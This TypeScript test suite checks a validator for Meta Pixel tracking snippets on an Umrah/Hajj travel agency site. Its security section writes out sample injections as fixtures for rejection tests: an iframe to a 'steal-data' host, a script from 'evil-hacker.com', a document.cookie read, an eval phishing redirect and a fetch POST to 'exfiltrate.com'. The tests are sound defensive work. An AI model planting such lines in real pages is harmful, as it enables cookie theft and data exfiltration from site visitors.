/**
 * AL-GAFUR Meta Pixel Security, Parser & Integration Verification Script
 * 
 * Verifies:
 * 1. Allowlist parser and numeric ID extraction from full official Meta Pixel snippets.
 * 2. Multi-format support (single quote, double quote, noscript tag, raw numeric ID).
 * 3. Security rejection of malicious code (iframes, external unapproved CDNs, XSS, eval, cookies).
 * 4. Route exclusion enforcement (/admin, /agent, /customer, /login, /signup, /track-booking).
 * 5. PII sanitization in standard events (ViewContent, Lead).
 */

import {
  validateAndExtractMetaPixel,
  isRouteExcludedFromPixel,
  EXCLUDED_PIXEL_ROUTES,
  getMetaPixelSnippetTemplate,
} from "../src/lib/meta-pixel";

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  \x1b[32m✓ PASS:\x1b[0m ${testName}`);
  } else {
    failedTests++;
    console.error(`  \x1b[31m✗ FAIL:\x1b[0m ${testName}`);
    if (detail) console.error(`    Detail: ${detail}`);
  }
}

console.log("\n=======================================================");
console.log(" AL-GAFUR META PIXEL INTEGRATION & SECURITY TEST SUITE ");
console.log("=======================================================\n");

// --- TEST SUITE 1: Valid Meta Pixel Snippets ---
console.log("\x1b[1m[Suite 1] Valid Meta Pixel Snippet Extraction\x1b[0m");

const validStandardSnippet = `<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '987654321098765');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=987654321098765&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->`;

const res1 = validateAndExtractMetaPixel(validStandardSnippet);
assert(res1.isValid === true, "Standard Meta Pixel snippet parsed as valid", res1.error || undefined);
assert(res1.pixelId === "987654321098765", "Extracted numeric Pixel ID matches exactly (987654321098765)", `Got: ${res1.pixelId}`);
assert(res1.detectionType === "SNIPPET", "Detection type identified as SNIPPET", `Got: ${res1.detectionType}`);

// Variant: Double quotes
const doubleQuoteSnippet = `<script>
fbq("init", "112233445566778");
fbq("track", "PageView");
</script>`;
const res2 = validateAndExtractMetaPixel(doubleQuoteSnippet);
assert(res2.isValid === true, "Double quoted fbq('init', ...) parsed as valid");
assert(res2.pixelId === "112233445566778", "Extracted numeric Pixel ID matches double quoted value");

// Variant: Pure numeric ID
const rawNumericId = "998877665544332";
const res3 = validateAndExtractMetaPixel(rawNumericId);
assert(res3.isValid === true, "Pure numeric Pixel ID parsed as valid");
assert(res3.pixelId === "998877665544332", "Extracted pure numeric Pixel ID correctly");
assert(res3.detectionType === "RAW_ID", "Detection type identified as RAW_ID");

// Variant: Noscript tag only
const noscriptSnippet = `<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=554433221100998&ev=PageView&noscript=1" /></noscript>`;
const res4 = validateAndExtractMetaPixel(noscriptSnippet);
assert(res4.isValid === true, "Noscript-only tag parsed as valid");
assert(res4.pixelId === "554433221100998", "Extracted numeric Pixel ID from noscript img tag");
assert(res4.detectionType === "NOSCRIPT", "Detection type identified as NOSCRIPT");


// --- TEST SUITE 2: Security Allowlist Rejection ---
console.log("\n\x1b[1m[Suite 2] Security Allowlist & Injection Rejection\x1b[0m");

// 1. Script with malicious iframe
const iframeAttack = `${validStandardSnippet}\n<iframe src="https://malicious-site.com/steal-data"></iframe>`;
const resMal1 = validateAndExtractMetaPixel(iframeAttack);
assert(resMal1.isValid === false, "Rejected snippet containing embedded iframe tag");
assert(Boolean(resMal1.error?.includes("iframe")), "Error mentions prohibited iframe");

// 2. Script with unauthorized external script CDN
const cdnAttack = `<script src="https://evil-hacker.com/malicious.js"></script>\nfbq('init', '987654321098765');`;
const resMal2 = validateAndExtractMetaPixel(cdnAttack);
assert(resMal2.isValid === false, "Rejected unauthorized third-party external script src");
assert(Boolean(resMal2.error?.includes("evil-hacker.com")), "Error cites the unauthorized script domain");

// 3. Script attempting cookie theft
const cookieAttack = `<script>
fbq('init', '987654321098765');
const stolen = document.cookie;
</script>`;
const resMal3 = validateAndExtractMetaPixel(cookieAttack);
assert(resMal3.isValid === false, "Rejected snippet attempting document.cookie access");

// 4. Script attempting eval / dynamic execution
const evalAttack = `<script>
fbq('init', '987654321098765');
eval('window.location="http://phishing.com"');
</script>`;
const resMal4 = validateAndExtractMetaPixel(evalAttack);
assert(resMal4.isValid === false, "Rejected snippet attempting eval() dynamic execution");

// 5. Script attempting custom fetch / data exfiltration
const fetchAttack = `<script>
fbq('init', '987654321098765');
fetch('https://exfiltrate.com', { method: 'POST' });
</script>`;
const resMal5 = validateAndExtractMetaPixel(fetchAttack);
assert(resMal5.isValid === false, "Rejected snippet attempting custom fetch() network request");

// 6. Empty / Whitespace input
const emptyRes = validateAndExtractMetaPixel("   ");
assert(emptyRes.isValid === false, "Rejected empty / whitespace snippet gracefully");


// --- TEST SUITE 3: Sensitive Route Exclusion ---
console.log("\n\x1b[1m[Suite 3] Sensitive Route Exclusion Enforcement\x1b[0m");

// Excluded routes
const sensitiveRoutes = [
  "/admin",
  "/admin/settings",
  "/admin/crm/leads",
  "/admin/youtube-leads",
  "/agent",
  "/agent/dashboard",
  "/customer",
  "/customer/dashboard",
  "/customer/bookings",
  "/login",
  "/signup",
  "/track-booking",
  "/api/settings",
  "/api/leads",
];

sensitiveRoutes.forEach((route) => {
  const isExcluded = isRouteExcludedFromPixel(route);
  assert(isExcluded === true, `Route correctly excluded: ${route}`);
});

// Permitted public routes
const publicRoutes = [
  "/",
  "/about",
  "/packages",
  "/packages/umrah-platinum-package-2026",
  "/ramadan-umrah",
  "/hajj",
  "/umrah",
  "/contact",
  "/faq",
  "/lead/youtube-lead",
  "/lead/umrah-direct-inquiry",
  "/booking",
];

publicRoutes.forEach((route) => {
  const isExcluded = isRouteExcludedFromPixel(route);
  assert(isExcluded === false, `Public route allowed for tracking: ${route}`);
});


// --- TEST SUITE 4: Safe Template Generation ---
console.log("\n\x1b[1m[Suite 4] Safe Clean Template Generation\x1b[0m");

const template = getMetaPixelSnippetTemplate("123456789012345");
assert(template.includes("fbq('init', '123456789012345');"), "Clean template contains sanitized fbq('init', ...)");
assert(template.includes("connect.facebook.net/en_US/fbevents.js"), "Clean template connects to official Meta endpoint");
assert(template.includes("id=123456789012345"), "Noscript tag contains sanitized pixel id");


// --- SUMMARY ---
console.log("\n=======================================================");
console.log(` TEST SUMMARY: Total: ${totalTests} | Passed: ${passedTests} | Failed: ${failedTests}`);
console.log("=======================================================\n");

if (failedTests > 0) {
  process.exit(1);
} else {
  console.log("\x1b[32m✔ All Meta Pixel security, allowlist, and route exclusion tests PASSED!\x1b[0m\n");
}
